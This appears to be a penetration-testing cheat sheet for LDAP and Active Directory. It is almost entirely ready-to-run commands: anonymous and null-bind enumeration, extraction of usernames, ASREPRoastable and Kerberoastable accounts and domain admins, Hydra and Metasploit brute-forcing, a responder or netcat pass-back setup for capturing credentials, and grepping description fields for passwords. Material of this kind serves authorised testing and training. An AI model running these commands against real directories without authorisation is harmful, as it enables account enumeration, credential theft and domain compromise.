## Enumeration

### Quick Check (One-liner)

```shell
ldapsearch -x -H ldap://$rhost -b "" -s base namingContexts && nmap -p 389 --script "ldap-rootdse" $rhost
```

### Quick Anonymous Check (One-liner)

```shell
# Check anonymous bind + get naming contexts
ldapsearch -x -H ldap://$rhost -b "" -s base "(objectclass=*)" namingContexts 2>/dev/null | grep namingContexts

# Full anonymous enumeration
ldapsearch -x -H ldap://$rhost -b "dc=${domain%%.*},dc=${domain##*.}" "(objectclass=*)" 2>/dev/null | head -100
```

### Nmap Scripts (One-liner)

```shell
# All LDAP scripts in one command
nmap -p 389,636,3268 --script "ldap-*" $rhost
```

### User Enumeration (One-liner)

```shell
# Extract all usernames
ldapsearch -x -H ldap://$rhost -b "dc=${domain%%.*},dc=${domain##*.}" "(objectClass=user)" sAMAccountName 2>/dev/null | grep sAMAccountName | awk '{print $2}' | sort -u | tee ldap_users.txt

# Find ASREPRoastable users (pre-auth disabled)
ldapsearch -x -H ldap://$rhost -b "dc=${domain%%.*},dc=${domain##*.}" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName 2>/dev/null | grep sAMAccountName

# Find Kerberoastable users (with SPNs)
ldapsearch -x -H ldap://$rhost -b "dc=${domain%%.*},dc=${domain##*.}" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName 2>/dev/null

# Users with description (may contain passwords)
ldapsearch -x -H ldap://$rhost -b "dc=${domain%%.*},dc=${domain##*.}" "(&(objectClass=user)(description=*))" sAMAccountName description 2>/dev/null | grep -E "sAMAccountName|description"
```

### Group Enumeration

```shell
# List all groups
ldapsearch -x -H ldap://$rhost -b "dc=example,dc=com" "(objectClass=group)" cn

# Domain Admins
ldapsearch -x -H ldap://$rhost -b "dc=example,dc=com" "(cn=Domain Admins)" member

# All admin groups
ldapsearch -x -H ldap://$rhost -b "dc=example,dc=com" "(&(objectClass=group)(cn=*admin*))" cn member
```

### Computer Enumeration

```shell
# List computers
ldapsearch -x -H ldap://$rhost -b "dc=example,dc=com" "(objectClass=computer)" cn

# Domain controllers
ldapsearch -x -H ldap://$rhost -b "dc=example,dc=com" "(userAccountControl:1.2.840.113556.1.4.803:=8192)" dNSHostName
```

## Attack Vectors

### Anonymous Bind

```shell
# Test anonymous access
ldapsearch -x -H ldap://$rhost -b "dc=example,dc=com" "(objectClass=*)"

# If successful, enumerate
ldapsearch -x -H ldap://$rhost -b "dc=example,dc=com" "(objectClass=user)"
ldapsearch -x -H ldap://$rhost -b "dc=example,dc=com" "(objectClass=group)"
```

### Null Bind

```shell
# Bind with empty credentials
ldapsearch -x -H ldap://$rhost -D "" -w "" -b "dc=example,dc=com"
```

### Brute Force

```shell
# Using Hydra
hydra -L users.txt -P passwords.txt $rhost ldap2 -s 389

# Using Metasploit
use auxiliary/scanner/ldap/ldap_login
set RHOSTS $rhost
set USERNAME admin
set PASS_FILE passwords.txt
run
```

### Pass-Back Attack

```shell
# Setup rogue LDAP server to capture credentials
sudo responder -I eth0
# or
sudo nc -lvnp 389
```

### Kerberoasting Targets

```shell
# Find SPNs (Service Principal Names)
ldapsearch -x -H ldap://$rhost -D "cn=admin,dc=example,dc=com" -w password \
  -b "dc=example,dc=com" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
```

### ASREPRoasting Targets

```shell
# Find users with "Do not require Kerberos preauthentication"
ldapsearch -x -H ldap://$rhost -D "cn=admin,dc=example,dc=com" -w password \
  -b "dc=example,dc=com" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
```

### Password Hunting

```shell
# Look for passwords in description field
ldapsearch -x -H ldap://$rhost -b "dc=example,dc=com" "(description=*)" description | grep -i "pass\|pwd\|secret"
```

## Common LDAP Filters

```shell
# All users
(objectClass=user)

# All groups
(objectClass=group)

# All computers
(objectClass=computer)

# Domain Admins
(cn=Domain Admins)

# Users with SPNs
(&(objectClass=user)(servicePrincipalName=*))

# Disabled accounts
(userAccountControl:1.2.840.113556.1.4.803:=2)
```
